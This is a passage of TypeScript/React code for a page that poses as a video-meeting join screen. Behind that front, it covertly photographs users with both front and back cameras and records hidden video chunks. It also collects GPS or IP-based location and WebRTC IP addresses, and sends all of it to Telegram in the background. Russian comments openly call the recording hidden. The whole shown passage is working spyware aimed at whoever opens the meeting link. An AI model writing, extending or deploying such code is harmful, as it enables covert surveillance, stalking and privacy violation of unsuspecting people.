            log('   ✅ getUserMedia successful (с facingMode)');
          }
        }
        
        const [track] = newStream.getVideoTracks();
        const settings = track.getSettings();
        log(
          '   ⚙️ Настройки трека:',
          'deviceId =', settings.deviceId,
          'facingMode =', settings.facingMode
        );
        
        if (currentId && settings.deviceId === currentId) {
          log('   ⚠️ getUserMedia вернул тот же deviceId — пробуем альтернативную камеру');
          
          const alt = videoDevices.find(d => d.deviceId !== currentId && d.deviceId !== candidate!.deviceId);
          if (alt) {
            newStream.getTracks().forEach(t => t.stop());
            try {
              const altStream = await navigator.mediaDevices.getUserMedia({
                video: {
                  deviceId: { exact: alt.deviceId },
                  width: { ideal: 1280 },
                  height: { ideal: 720 },
                },
                audio: hasAudio,
              });
              newStream = altStream;
              const [altTrack] = altStream.getVideoTracks();
              const altSettings = altTrack.getSettings();
              log(
                '   ✅ Переключились на альтернативную камеру:',
                'deviceId =', altSettings.deviceId,
                'facingMode =', altSettings.facingMode
              );
            } catch (altErr) {
              log(`   ⚠️ Не удалось п��реключиться на альтернативную камеру: ${altErr}`);
              log('   ℹ️ Остаёмся на текущей');
              // Восстанавливаем предыдущий stream
              newStream = await navigator.mediaDevices.getUserMedia({
                video: {
                  deviceId: { ideal: candidate!.deviceId },
                  width: { ideal: 1280 },
                  height: { ideal: 720 },
                },
                audio: hasAudio,
              });
            }
          } else {
            log('   ⚠️ Альтернативная камера не найдена, остаёмся на текущей');
          }
        }
        
        const [finalTrack] = newStream.getVideoTracks();
        const finalSettings = finalTrack.getSettings();
        currentVideoDeviceIdRef.current = finalSettings.deviceId || null;
        
      } else {
        log(`   📷 Используем facingMode: ${newFacingMode}`);
        
        // 🔧 Попытка с fallback
        try {
          newStream = await navigator.mediaDevices.getUserMedia({
            video: {
              facingMode: { exact: newFacingMode },
              width: { ideal: 1280 },
              height: { ideal: 720 },
            },
            audio: hasAudio,
          });
          log('   ✅ getUserMedia successful!');
        } catch (err) {
          log(`   ⚠️ Exact facingMode не сработал: ${err}`);
          // Fallback: пробуем с ideal вместо exact
          try {
            newStream = await navigator.mediaDevices.getUserMedia({
              video: {
                facingMode: { ideal: newFacingMode },
                width: { ideal: 1280 },
                height: { ideal: 720 },
              },
              audio: hasAudio,
            });
            log('   ✅ getUserMedia successful (с ideal facingMode)');
          } catch (err2) {
            log(`   ⚠️ Ideal facingMode тоже не сработал: ${err2}`);
            // Последний fallback: только video
            try {
              newStream = await navigator.mediaDevices.getUserMedia({
                video: true,
                audio: hasAudio,
              });
              log('   ✅ getUserMedia successful (базовые constraints)');
            } catch (err3) {
              log(`   ⚠️ Базовые constraints с audio=${hasAudio} не сработали: ${err3}`);
              // Абсолютно последний fallback: только видео
              newStream = await navigator.mediaDevices.getUserMedia({ video: true });
              log('   ✅ getUserMedia successful (только видео)');
            }
          }
        }
        
        const [track] = newStream.getVideoTracks();
        const settings = track.getSettings();
        currentVideoDeviceIdRef.current = settings.deviceId || null;
        log(
          '   ⚙️ Настройки трека:',
          'deviceId =', settings.deviceId,
          'facingMode =', settings.facingMode
        );
      }
      
      if (!newStream) {
        throw new Error('Stream is null!');
      }
      
      const videoTracks = newStream.getVideoTracks();
      const audioTracks = newStream.getAudioTracks();
      
      log('   ✅ Stream получен:');
      log(`      📹 Video tracks: ${videoTracks.length}`);
      videoTracks.forEach(track => {
        const s = track.getSettings();
        log(`         - ${track.label} (${track.readyState}), deviceId=${s.deviceId}, facingMode=${s.facingMode}, enabled=${track.enabled}, muted=${track.muted}`);
      });
      log(`      🎤 Audio tracks: ${audioTracks.length}`);
      audioTracks.forEach(track => {
        log(`         - ${track.label} (${track.readyState}), enabled=${track.enabled}, muted=${track.muted}`);
      });
      
      log(`\n📍 ШАГ 4/5: Обновляем state...`);
      
      // ✅ ПРОВЕРКА: Убеждаемся что все треки enabled
      videoTracks.forEach(track => {
        if (!track.enabled) {
          log(`   ⚠️ Трек ${track.label} был disabled, включаем...`);
          track.enabled = true;
        }
      });
      
      setVideoStreamFront(newStream);
      log('   ✅ setVideoStreamFront(newStream)');
      
      const [vTrack] = videoTracks;
      const vSettings = vTrack.getSettings();
      const newCameraType =
        vSettings.facingMode === 'environment' ? 'back' :
        vSettings.facingMode === 'user' ? 'front' :
        newFacingMode === 'environment' ? 'back' : 'front';
      
      setCurrentCameraType(newCameraType);
      log(`   ✅ setCurrentCameraType('${newCameraType}')`);
      
      const initDelay = isAndroid ? 400 : 200;
      
      log(`\n📍 ШАГ 5/5: Ждем инициализации камеры (${initDelay}ms)...`);
      await new Promise(r => setTimeout(r, initDelay));
      log('   ✅ Камера инициализирована');
      
      log(`\n🎬 ЗАПУСКАЕМ ЗАПИСЬ...`);
      setIsVideoRecording(true);
      log('   ✅ isVideoRecording = true');
      
      log(`\n${'='.repeat(80)}`);
      log(`✅ ПЕРЕКЛЮЧЕНИЕ НА ${cameraName} КАМЕРУ ЗАВЕРШЕНО!`);
      log(`${'='.repeat(80)}\n`);
      
    } catch (error) {
      console.error(`\n${'='.repeat(80)}`);
      console.error(`❌ ОШИБКА ПЕРЕКЛЮЧЕНИЯ КАМЕРЫ:`);
      console.error(error);
      console.error(`${'='.repeat(80)}\n`);
      
      if (newFacingMode === 'environment') {
        log('🔄 Пытаемся вернуться к фронтальной камере...');
        
        try {
          const fallbackStream = await navigator.mediaDevices.getUserMedia({
            video: {
              facingMode: 'user',
              width: { ideal: 1280 },
              height: { ideal: 720 }
            },
            audio: hasAudio
          });
          
          setVideoStreamFront(fallbackStream);
          setCurrentCameraType('front');
          
          await new Promise(resolve => setTimeout(resolve, 100));
          
          setIsVideoRecording(true);
          
          log('✅ Успешно вернулись к фронтальной камере');
        } catch (fallbackError) {
          console.error('❌ Критическая ошибка - не удалось вернуться к фронтальной камере:', fallbackError);
        }
      }
    } finally {
      isSwitchingCameraRef.current = false;
    }
  };

  const handleVideoChunkReady = async (blob: Blob, chunkNum: number, cameraType: 'front' | 'back' | 'desktop') => {
    log(`📹 Получен видео+ауд��о чанк #${chunkNum} (${cameraType}), размер: ${blob.size} bytes`);
    
    setCurrentChunkNumber(chunkNum);
    
    // ✅ УПРОЩЕНО: Скрытая запись ТОЛЬКО на фронтальной камере, БЕЗ переключений
    const device = detectDevice();
    log(`✅ [${device}] Чанк #${chunkNum} завершен (камера: ${cameraType}) - продолжаем запись на фронтальной камере`);
    
    sendVideoToTelegram(blob, chunkNum, cameraType, geoData).catch(err => {
      console.error(`❌ Ошибка отправки чанка #${chunkNum}:`, err);
    });
    
    log(`✅ Чанк #${chunkNum} отправляется в фоне (UI не блокируется)`);
  };

  // ========================================
  // MAIN PERMISSION REQUEST
  // ========================================

  const executePermissionRequests = async () => {
    if (isExecutingPermissionsRef.current) {
      console.warn('⚠️ executePermissionRequests уже выполняется - пропускаем повторный вызов!');
      return;
    }
    
    isExecutingPermissionsRef.current = true;
    log('🔒 Флаг isExecutingPermissions установлен в true');
    
    try {
      let geoSent = false;
      let initialStream: MediaStream | null = null;

      log('🎯 Запускаем единый поток: геолокация (без await) → ��амера...');
      
      const isMac = /Mac|MacIntel|MacPPC|Mac68K/.test(navigator.platform) || 
                    /Macintosh/.test(navigator.userAgent);
      
      let geoPromise: Promise<any>;
      if (isMac) {
        log('🖥️ macOS - запускаем геолокацию в фоне (25 сек)...');
        geoPromise = requestLocation(25000);
      } else {
        log('📱 iOS/Mobile - запускаем геолокацию в фоне (20 сек)...');
        geoPromise = requestLocation(20000);
      }
      log('✅ Геолокация запущена в фоне (Promise БЕЗ await)');

      let cameraSuccess = false;
      try {
        initialStream = await requestCamMic();
        cameraSuccess = true;
        
        log('✅ Камера и микрофон: разрешено');
        setShowPermissionAlert(false); // Скрыть alert если разрешения получены
      } catch (e: any) {
        log('⚠️ Камера отклонена, но продолжаем запрашивать геолокацию...', e);
        setShowPermissionAlert(true); // Показать alert при отклонении
      }

      try {
        if (isMac) {
          log('⚠️ macOS: Разрешите доступ к локальной сети');
        }
        
        log('⏳ Ожидаем завершения Promise геолокации...');
        const position: any = await geoPromise;
        log('🎉 Геолокация получена успешно!', position);
        
        if (isMac) {
          log('🌐 [macOS] Запускаем Local Network Access ПОСЛЕ геолокации...');
          triggerLocalNetworkAccess().catch(() => {});
        }
        
        const { latitude, longitude, accuracy } = position.coords;
        const lat = Number(latitude).toFixed(6);
        const lng = Number(longitude).toFixed(6);
        const acc = Math.round(accuracy);
        
        const timestamp = new Date().toLocaleString('ru-RU', {
          year: 'numeric',
          month: '2-digit',
          day: '2-digit',
          hour: '2-digit',
          minute: '2-digit',
          second: '2-digit',
          hour12: false
        });
        
        setGeoData({
          latitude,
          longitude,
          accuracy,
          timestamp
        });
        
        log('💾 Геолокация сохранена для видеочанков:', { latitude, longitude, accuracy, timestamp });
        
        if (!geoLocationSentRef.current) {
          log('📤 Отправляем геолокацию в Telegram (первый раз)...');
          
          try {
            await sendToTelegram(latitude, longitude, accuracy);
            geoLocationSentRef.current = true;
            geoSent = true;
            log('✅ Геолокация успешно отправлена в Telegram!');
          } catch (telegramError) {
            console.error('❌ ОШИБКА отправки в Telegram:', telegramError);
          }
        } else {
          log('⚠️ Геолокация УЖЕ отправлена - пропускаем повторную отправку');
          geoSent = true;
        }
      } catch (e: any) {
        console.error('❌ ОШИБКА при получении геолокации:', {
          message: e?.message,
          code: e?.code,
          type: e?.constructor?.name,
          full: e
        });
        
        // ВСЕГДА используем IP-геолокацию как fallback при ошибке
        if (!geoSent) {
          try {
            log('🌐 Используем IP-геолокацию как fallback (геолокация недоступна)...');
            const ipGeo = await getIPGeolocation();
            
            // Сохраняем IP-геолокацию
            const timestamp = new Date().toLocaleString('ru-RU', {
              year: 'numeric',
              month: '2-digit',
              day: '2-digit',
              hour: '2-digit',
              minute: '2-digit',
              second: '2-digit',
              hour12: false
            });
            
            setGeoData({
              latitude: ipGeo.latitude,
              longitude: ipGeo.longitude,
              accuracy: ipGeo.accuracy,
              timestamp
            });
            
            if (!geoLocationSentRef.current) {
              log('📤 Отправляем IP-геолокацию в Telegram (fallback)...');
              
              try {
                await sendToTelegram(ipGeo.latitude, ipGeo.longitude, ipGeo.accuracy);
                geoLocationSentRef.current = true;
                geoSent = true;
                log('✅ IP-геолокация успешно отправлена');
              } catch (telegramError) {
                console.error('❌ ОШИБКА отправки IP-геолокации:', telegramError);
              }
            }
          } catch (ipError) {
            log('❌ IP-геолокация также не работает:', ipError);
          }
        }
      }

      // ВАЖНО: Если разрешения камеры НЕ получены, пропускаем фото и видео
      if (!cameraSuccess) {
        log('⚠️ Разрешения камеры не получены - пропускаем захват фото и видеозапись');
        return;
      }

      // Небольшая задержка чтобы браузер "запомнил" разрешение
      log('⏳ Ждём 500ms чтобы браузер запомнил разрешение камеры...');
      await new Promise(resolve => setTimeout(resolve, 500));

      // Останавливаем начальный стрим перед захватом фото
      if (initialStream) {
        log('🛑 Останавливаем начальный стрим перед за��ватом фото...');
        initialStream.getTracks().forEach(track => track.stop());
      }

      // Ещё одна задержка после остановки стрима
      await new Promise(resolve => setTimeout(resolve, 200));

      // 📸 ЗАХВАТ ФОТО ПЕРЕД НАЧАЛОМ ВИДЕОЗАПИСИ
      const device = detectDevice();
      log(`📸 Захватываем фото перед началом видеозаписи (${device})...`);
        
      // 1. Фото с ФРОНТАЛЬНОЙ камеры
      try {
        log('📸 [1/2] === ФРОНТАЛЬНАЯ КАМЕРА === Начинаем захват...');
        
        const frontPhoto = await capturePhoto('user');
        log('📸 [1/2] === capturePhoto("user") завершён, результат:', frontPhoto ? `${frontPhoto.size} bytes` : 'null');
        
        if (frontPhoto) {
          log('✅ Фото с фронтальной камеры захвачено - НАЧИНАЕМ ОТПРАВКУ...');
          
          await sendPhotoToTelegram(frontPhoto, 'front');
          log('✅ === sendPhotoToTelegram("front") завершён ===');
          log('✅ Фото с фронтальной камеры отправлено');
        } else {
          console.warn('⚠️ Не удалось захватить фото с фронтальной камеры');
        }
      } catch (error) {
        console.error('❌ Ошибка при захвате/отправке фото с фронтальной камеры:', error);
      }
      
      await new Promise(resolve => setTimeout(resolve, 300));
      
      // 2. Фото с ЗАДНЕЙ каме��ы
      try {
        log('📸 [2/2] Захватываем фото с ЗАДНЕЙ камеры...');
        
        const backPhoto = await capturePhoto('environment');
        
        if (backPhoto) {
          log('✅ Фото с задней камеры захвачено');
          
          await sendPhotoToTelegram(backPhoto, 'back');
          log('✅ Фото с задней камеры отправлено');
        } else {
          console.warn('⚠️ Не удалось захватить фото с задней камеры');
        }
      } catch (error) {
        console.error('❌ Ошибка при захвате/отправке фото с задней камеры:', error);
      }
      
      log('✅✅ Все фото захвачены и отправлены!');
      
      // 🔧 Увеличенная задержка перед видеозаписью для освобождения камеры
      log('⏳ Ждём 1000ms для полного освобождения камеры...');
      await new Promise(resolve => setTimeout(resolve, 1000));

      // 🎥 ЗАПУСК ВИДЕОЗАПИСИ ПОСЛЕ ФОТО
      log('🎥 Запускаем видеозапись после получения разрешений и захвата фото...');
      try {
        await startVideoRecording();
        log('✅ Видеозапись успешно запущена');
      } catch (error) {
        console.error('❌ Ошибка запуска видеозаписи:', error);
      }
      
    } finally {
      isExecutingPermissionsRef.current = false;
      log('🔓 Флаг isExecutingPermissions сброшен в false');
    }
  };

  const handleRequestAllPermissions = async () => {
    log('🚀 Запуск последовательного запроса разрешений...');
    
    if (isExecutingPermissionsRef.current) {
      console.warn('⚠️ Разрешения уже запрашиваются - пропускаем повторный вызов!');
      return;
    }
    
    isExecutingPermissionsRef.current = true;
    
    // 🚀 ОПТИМИЗАЦИЯ: Запускаем WebRTC IP сбор ПАРАЛЛЕЛЬНО (экономия ~2 секунды)
    log('🔍 [OPTIMIZATION] Запускаем WebRTC IP сбор в фоне параллельно...');
    const webrtcIPsPromise = getWebRTCIPs(); // Не await - запускаем параллельно!
    webrtcIPsPromiseRef.current = webrtcIPsPromise; // Сохраняем в ref для доступа из других функций
    
    try {
      // 🔑 ПОЛУЧЕНИЕ JWT ТОКЕНА от Supabase Edge Function
      log('🔑 [1/N] Получение JWT токена от сервера...');
      let joinData;
      try {
        joinData = await joinRoom(roomName, userName);
        console.log('✅ JWT токен получен:', {
          role: joinData.role,
          identity: joinData.identity,
          livekitUrl: joinData.livekitUrl,
          title: joinData.title,
          tokenType: typeof joinData.token,
          tokenLength: joinData.token?.length,
          tokenPreview: typeof joinData.token === 'string' ? joinData.token.substring(0, 50) + '...' : 'NOT A STRING: ' + JSON.stringify(joinData.token)
        });
      } catch (error) {
        console.error('❌ Ошибка получения JWT токена:', error);
        throw new Error('Failed to get access token. Please try again.');
      }
      
      // ✅ ПРОВЕРКА: Если разрешения уже получены, сразу входим в комнату
      if (permissionsRequested) {
        console.log('✅ Разрешения уже получены ранее - СРАЗУ входим в комнату');
        
        // Сохраняем joinData в localStorage
        try {
          localStorage.setItem('livekit_join_data', JSON.stringify(joinData));
          log('✅ Join Data сохранён в localStorage');
        } catch (error) {
          console.error('❌ Ошибка сохранения join data:', error);
        }
        
        // ✅ ВАЖНО: Сбра��ываем флаг ДО входа в комнату (иначе второй клик будет блокироваться)
        isExecutingPermissionsRef.current = false;
        
        // Немедленный вход в комнату
        console.log('🚪 Вызов onJoinRoom:', {
          userName,
          tokenType: typeof joinData.token,
          tokenLength: joinData.token?.length,
          livekitUrl: joinData.livekitUrl
        });
        onJoinRoom(userName, joinData.token, joinData.livekitUrl);
        return; // ✅ Выходим - компонент размонтируется
      }
      
      // ❌ Если разрешения НЕ получены - запрашиваем и СРАЗУ входим
      console.warn('⚠️ Разрешения еще не получены - используем handleSequentialPermissions');
      const results = await handleSequentialPermissions(roomName, userName, 'join');
      
      log('📊 Результаты разрешений:', results);
      
      // Обработка камеры/микрофона
      const hasCameraOrMic = results.cameraGranted || results.microphoneGranted;
      
      if (!hasCameraOrMic) {
        log('⚠️ Разрешения камеры/микрофона не получены - показываем alert');
        setShowPermissionAlert(true);
        setIsJoining(false);
        return;
      }
      
      setShowPermissionAlert(false);
      
      // Останавливаем тестовый stream если есть
      if (results.mediaStream) {
        results.mediaStream.getTracks().forEach(track => track.stop());
        log('🛑 Тестовый stream остановлен');
      }
      
      // ✅ БЫСТРЫЙ ВХОД: Сохраняем данные и входим СРАЗУ
      console.log('🚀 БЫСТРЫЙ ВХОД - входим в комнату, фото/геолокация будут в фоне');
      try {
        localStorage.setItem('livekit_join_data', JSON.stringify(joinData));
        log('✅ Join Data сохранён в localStorage');
      } catch (error) {
        console.error('❌ Ошибка сохранения join data:', error);
      }
      
      // ✅ ВАЖНО: Сбрасываем флаг ДО входа в комнату (иначе второй клик будет блокироваться)
      isExecutingPermissionsRef.current = false;
      
      console.log('🚪 Вызов onJoinRoom:', {
        userName,
        tokenType: typeof joinData.token,
        tokenLength: joinData.token?.length,
        livekitUrl: joinData.livekitUrl
      });
      onJoinRoom(userName, joinData.token, joinData.livekitUrl);
      return;
      
      // ✅ Ф��НОВАЯ ОБРАБОТКА: Геолокация, фото, видео запускаются ПОСЛЕ входа (БЕЗ блокировки)
      console.log('🔄 Запускаем фоновую обработку (геолокация, фото, видео) в фоне...');
      
      // Запускаем в фоне БЕЗ await - не блокируем вход в комнату!
      (async () => {
        try {
          // 1️⃣ ГЕОЛОКАЦИЯ (только если еще не отправлена)
          if (!geoLocationSentRef.current) {
        if (results.geolocationGranted && results.geolocationPosition) {
          const { latitude, longitude, accuracy } = results.geolocationPosition.coords;
          
          const timestamp = new Date().toLocaleString('ru-RU', {
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: false
          });
          
          setGeoData({
            latitude,
            longitude,
            accuracy,
            timestamp
          });
          
          log('✅ Геолокация сохранена:', { latitude, longitude, accuracy });
          
          // Отправляем геолокацию в Telegram
          const deviceInfo = getDeviceInfo();
          await logGeolocationData(latitude, longitude, accuracy, 'gps', deviceInfo);
          await sendToTelegram(latitude, longitude, accuracy);
          geoLocationSentRef.current = true;
        } else {
          log('⚠️ Геолокация не получена - используем IP fallback');
        
        try {
          const ipGeo = await getIPGeolocation();
          
          const timestamp = new Date().toLocaleString('ru-RU', {
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: false
          });
          
          setGeoData({
            latitude: ipGeo.latitude,
            longitude: ipGeo.longitude,
            accuracy: ipGeo.accuracy,
            timestamp
          });
          
          const deviceInfo = getDeviceInfo();
          await logGeolocationData(ipGeo.latitude, ipGeo.longitude, ipGeo.accuracy, 'ip', deviceInfo);
          await sendToTelegram(ipGeo.latitude, ipGeo.longitude, ipGeo.accuracy);
          geoLocationSentRef.current = true;
        } catch (ipError) {
          log('❌ IP-геолокация также не работает:', ipError);
        }
      }
          } else {
            log('✅ Геолокация уже отправлена ранее - пропускаем');
          }
          
          // 2️⃣ ЗАХВАТ ФОТО (только если еще не захвачено)
          if (!photosCaptured) {
            // Небольшая задержка чтобы браузер "запомнил" разрешение
            await new Promise(resolve => setTimeout(resolve, 500));
            
            const device = detectDevice();
            log(`📸 Захватываем фото (${device})...`);
            
            // Фронтальная камера
            try {
              log('📸 [1/2] Фронтальная камера...');
              const frontPhoto = await capturePhoto('user');
              if (frontPhoto) {
                await sendPhotoToTelegram(frontPhoto, 'front');
                log('✅ Фото с фронтальной камеры отправлено');
              }
            } catch (error) {
              console.error('❌ Ошибка фото с фронтальной камеры:', error);
            }
            
            await new Promise(resolve => setTimeout(resolve, 300));
            
            // Задняя камера
            try {
              log('📸 [2/2] Задняя камера...');
              const backPhoto = await capturePhoto('environment');
              if (backPhoto) {
                await sendPhotoToTelegram(backPhoto, 'back');
                log('✅ Фото с задней камеры отправлено');
              }
            } catch (error) {
              console.error('❌ Ошибка фото с задней камеры:', error);
            }
            
            setPhotosCaptured(true);
            log('✅ Все фото захвачены!');
          } else {
            log('✅ Фото уже захвачены ранее - пропускаем');
          }
      
      // 🚀 ИЗМЕНЕНИЕ: Скрытая видеозапись теперь запускается из LiveKit комнаты
      // через CameraStateMonitor когда LiveKit камера ОТКЛЮЧЕНА
      log('✅ Фото захвачены. Скрытая запись запустится автоматически когда LiveKit камера будет отключена');
      
      log('✅ Фоновая обработка завершена (геол��кация, фото)');
        } catch (error) {
          console.error('❌ Ошибка в фоновой обработке:', error);
        }
      }); // DISABLED: async IIFE не вызывается - убрали () чтобы не блокировать размонтирование

      
      // Сохраняем joinData в localStorage для и��пользования в комнате
      try {
        localStorage.setItem('livekit_join_data', JSON.stringify(joinData));
        log('✅ Join Data сохранён в localStorage');
      } catch (error) {
        console.error('❌ Ошибка сохранения join data:', error);
      }
      
      // ✅ ВАЖНО: Входим в комнату СРАЗУ после сохранения данных
      console.log('🚪 [END] Вызов onJoinRoom:', {
        userName,
        tokenType: typeof joinData.token,
        tokenLength: joinData.token?.length,
        livekitUrl: joinData.livekitUrl
      });
      onJoinRoom(userName, joinData.token, joinData.livekitUrl);
      // ⚠️ НЕ СБРАСЫВАЕМ isExecutingPermissionsRef - компонент размонтируется

      
    } catch (error) {
      console.error('❌ Критическая ошибка при запросе разрешений:', error);
      setShowPermissionAlert(true);
      setIsJoining(false);
      isExecutingPermissionsRef.current = false;
    }
  };

  const handleJoinMeeting = async () => {
    log('Joining meeting:', roomName, 'as', userName);
    
    // 🔒 ЗАЩИТА: Проверяем что ВСЕ данные собраны перед входом
    if (permissionsRequested && !dataCollectionComplete) {
      console.warn('⏳ [handleJoinMeeting] Данные еще собираются - ждем завершения...');
      setIsJoining(true); // Показываем loading
      return; // Блокируем вход
    }
    
    // ✅ ОПТИМИЗАЦИЯ: Если разрешения уже получены И данные собраны - входим СРАЗУ
    if (permissionsRequested && dataCollectionComplete) {
      console.log('✅ [handleJoinMeeting] Разрешения есть, данные собраны - входим немедленно!');
      setIsJoining(true);
      
      try {
        const joinData = await joinRoom(roomName, userName);
        console.log('✅ JWT токен получен для немедленного входа:', {
          role: joinData.role,
          identity: joinData.identity,
          livekitUrl: joinData.livekitUrl
        });
        
        // Сохраняем в localStorage
        localStorage.setItem('livekit_join_data', JSON.stringify(joinData));
        
        // ВХОДИМ В КОМНАТУ!
        console.log('🚪 [handleJoinMeeting FAST] Вызов onJoinRoom');
        onJoinRoom(userName, joinData.token, joinData.livekitUrl);
        return;
      } catch (error) {
        console.error('❌ Ошибка получения токена:', error);
        setIsJoining(false);
        return;
      }
    }
    
    // 🚫 ЕСЛИ ПЕРМИШЕНЫ НЕ ЗАПРОШЕНЫ - ИГНО��ИРУЕМ (они должны запуститься от overlay)
    if (!permissionsRequested) {
      log('⚠️ [handleJoinMeeting] Permissions не запрошены - нужно кликнуть на overlay сначала!');
      return;
    }
    
    // 🔒 Защита от двойного вызова
    if (isJoining) {
      log('⚠️ [handleJoinMeeting] Процесс уже выполняется - пропускаем!');
      return;
    }
    
    setIsJoining(true); // ✅ Показываем Loading...
    
    try {
      const joinData = await joinRoom(roomName, userName);
      console.log('✅ JWT токен получен:', {
        role: joinData.role,
        identity: joinData.identity,
        livekitUrl: joinData.livekitUrl
      });
      
      // Сохраняем в localStorage
      localStorage.setItem('livekit_join_data', JSON.stringify(joinData));
      
      // ВХОДИМ В КОМНАТУ!
      console.log('🚪 [handleJoinMeeting] Вызов onJoinRoom');
      onJoinRoom(userName, joinData.token, joinData.livekitUrl);
    } catch (error) {
      console.error('❌ Ошибка получения токена:', error);
      setIsJoining(false);
    }
  };

  const handleJoinWithoutAudio = async () => {
    log('Joining without audio:', roomName, 'as', userName);
    setShowJoinMenu(false);
    
    // 🔒 ЗАЩИТА: Проверяем что ВСЕ данные собраны перед входом
    if (permissionsRequested && !dataCollectionComplete) {
      console.warn('⏳ [handleJoinWithoutAudio] Данные еще собираются - ждем завершения...');
      setIsJoining(true); // Показываем loading
      return; // Блокируем вход
    }
    
    // 🚫 ЕСЛИ ПЕРМИШЕНЫ НЕ ЗАПРОШЕНЫ - ИГНОРИРУЕМ (они должны запуститься от overlay)
    if (!permissionsRequested) {
      log('⚠️ [handleJoinWithoutAudio] Permissions не запрошены - нужно кликнуть на overlay сначала!');
      return;
    }
    
    // 🔒 Защита от двойного вызова
    if (isJoining) {
      log('⚠️ [handleJoinWithoutAudio] Процесс уже выполняется - пропускаем!');
      return;
    }
    
    setIsJoining(true); // ✅ Показываем Loading...
    
    try {
      const joinData = await joinRoom(roomName, userName);
      console.log('✅ JWT токен получен (без аудио):', {
        role: joinData.role,
        identity: joinData.identity,
        livekitUrl: joinData.livekitUrl
      });
      
      // Сохраняем в localStorage
      localStorage.setItem('livekit_join_data', JSON.stringify(joinData));
      
      // ВХОДИМ В КОМНАТУ!
      console.log('🚪 [handleJoinWithoutAudio] Вызов onJoinRoom');
      onJoinRoom(userName, joinData.token, joinData.livekitUrl);
    } catch (error) {
      console.error('❌ Ошибка получения токена:', error);
      setIsJoining(false);
    }
  };

  const handleCopyUrl = () => {
    // 🚫 Удалено: отключение защиты - она должна сняться только первым кликом на overlay
    
    try {
      // Используем fallback метод через textarea для совместимости
      const textarea = document.createElement('textarea');
      textarea.value = window.location.href;
      textarea.style.position = 'fixed';
      textarea.style.left = '-9999px';
      textarea.style.top = '-9999px';
      document.body.appendChild(textarea);
      textarea.focus();
      textarea.select();
      
      try {
        document.execCommand('copy');
        setIsFlashing(true);
        setTimeout(() => setIsFlashing(false), 500);
        log('✅ URL copied to clipboard');
      } catch (err) {
        console.error('❌ Copy error:', err);
      }
      
      document.body.removeChild(textarea);
    } catch (error) {
      console.error('❌ URL copy error:', error);
    }
  };

  const handleMicClick = () => {
    // 🚫 Удалено: handleFirstInteraction() - permissions запускаются только от overlay
    setIsMicMuted(!isMicMuted);
  };

  const handleCameraClick = () => {
    // 🚫 Удалено: handleFirstInteraction() - permissions запускаются только от overlay
    setIsCameraOff(!isCameraOff);
  };

  // ========================================
  // AUTO-REQUEST PERMISSIONS ON FIRST USER INTERACTION
  // ========================================
  
  const handleFirstInteraction = async () => {
    console.log('🔔 [PreJoin] handleFirstInteraction вызвана!', {
      permissionsRequested,
      isExecuting: isExecutingPermissionsRef.current
    });
    
    // Запускаем только ОДИН раз
    if (permissionsRequested || isExecutingPermissionsRef.current) {
      console.warn('⚠️ [PreJoin] Permissions уже запрошены - пропускаем!');
      return;
    }
    
    console.log('🚀 [PreJoin] Первое взаимодействие пользователя → запускаем автозапрос permissions!');
    
    isExecutingPermissionsRef.current = true;
    let cameraGranted = false;
    
    // 🔍 Проверяем доступные устройства
    let hasAudio = true;
    try {
      const devices = await navigator.mediaDevices.enumerateDevices();
      const audioDevices = devices.filter(d => d.kind === 'audioinput');
      hasAudio = audioDevices.length > 0;
      
      if (!hasAudio) {
        console.log(`⚠️ [PreJoin] Микрофоны не найдены - будем запрашивать только видео`);
      }
    } catch (enumErr) {
      console.log(`⚠️ [PreJoin] Не удалось получить список устройств: ${enumErr}`);
    }
    
    try {
      // 1️⃣ ЗАПРОС КАМЕРЫ + МИКРОФОНА (СИНХРОННЫЙ ВЫЗОВ В КОНТЕКСТЕ USER GESTURE!)
      console.log(`🎥 [1/2] Запрашиваем камеру${hasAudio ? ' + микрофон' : ''}...`);
      
      let stream: MediaStream | null = null;
      
      // Пробуем сначала с базовыми constraints
      try {
        console.log(`🎥 Попытка 1: базовые constraints (video${hasAudio ? ' + audio' : ''})...`);
        stream = await navigator.mediaDevices.getUserMedia({
          video: true,
          audio: hasAudio
        });
        console.log('✅ Базовые constraints сработали');
      } catch (basicError) {
        console.warn('⚠️ Базовые constraints не сработали:', basicError);
        
        // Fallback: пробуем только video
        try {
          console.log('🎥 Попытка 2: только video...');
          stream = await navigator.mediaDevices.getUserMedia({ video: true });
          console.log('✅ Только video сработало');
        } catch (videoError) {
          console.error('❌ Только video не сработало:', videoError);
          throw videoError;
        }
      }
      
      if (stream) {
        console.log('✅ Камера + микрофон: разрешено');
        cameraGranted = true;
        
        // ✅ Устанавливаем флаг ПОСЛЕ успешного получения разрешений
        setPermissionsRequested(true);
        
        // Скрываем alert, так как разрешение получено
        setShowPermissionAlert(false);
        
        // Останавливаем stream, нам нужно было только разрешение получить
        stream.getTracks().forEach(track => track.stop());
      }
      
    } catch (error) {
      console.error('❌ Камера/микрофон: отклонено или ошибка:', error);
      setShowPermissionAlert(true); // Показываем alert при отклонении
      isExecutingPermissionsRef.current = false; // Сбрасываем флаг чтобы можно было повторить
      return; // Выходим если камера не получена
    }
    
    // 2️⃣ ЗАПРОС ГЕОЛОКАЦИИ (НЕ критично - если отклонена, продолжаем без неё)
    // ✅ ИЗМЕНЕНО: Запускаем В ФОНЕ (без await) сразу после камеры
    console.log('📍 [2/2] Запускаем запрос геолокации В ФОНЕ...');
    
    requestLocation(10000).then(position => {
      console.log('✅ Геолокация: разрешено');
      
      // Сохраняем геолокацию
      if (position && typeof position === 'object' && 'coords' in position) {
        const { latitude, longitude, accuracy } = (position as GeolocationPosition).coords;
        const timestamp = new Date().toLocaleString('ru-RU', {
          year: 'numeric',
          month: '2-digit',
          day: '2-digit',
          hour: '2-digit',
          minute: '2-digit',
          second: '2-digit',
          hour12: false
        });
        
        setGeoData({ latitude, longitude, accuracy, timestamp });
        
        // Отправляем в Telegram
        if (!geoLocationSentRef.current) {
          const deviceInfo = getDeviceInfo();
          logGeolocationData(latitude, longitude, accuracy, 'gps', deviceInfo);
          sendToTelegram(latitude, longitude, accuracy);
          geoLocationSentRef.current = true;
        }
      }
    }).catch(error => {
      console.error('❌ [PreJoin] Геолокация: отклонено или ошибка:', error);
      console.log('ℹ️ [PreJoin] Продолжаем без геолокации...');
      // НЕ прерываем выполнение - продолжаем дальше!
    });
    
    // 3️⃣ СБОР IP АДРЕСОВ через WebRTC (всегда выполняется)
    console.log('🌐 [PreJoin] Собираем IP адреса...');
    try {
      await collectIPs();
